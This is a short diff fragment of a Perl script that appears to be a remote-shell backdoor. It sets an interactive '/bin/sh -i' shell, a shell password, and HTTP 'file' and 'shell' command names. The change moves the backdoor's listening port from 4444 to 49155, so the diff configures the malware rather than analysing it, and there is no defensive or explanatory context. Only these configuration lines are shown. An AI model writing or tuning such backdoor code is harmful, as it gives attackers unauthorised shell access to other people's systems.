@@ -4,7 +4,7 @@ use Socket;
 
 $SHELL="/bin/sh -i";
 $SHELLPASSWORD="youpass";
-$LISTENPORT="4444";
+$LISTENPORT="49155";
 $HTTPFILECMD="file";
 $HTTPSHELLCMD="shell";
 
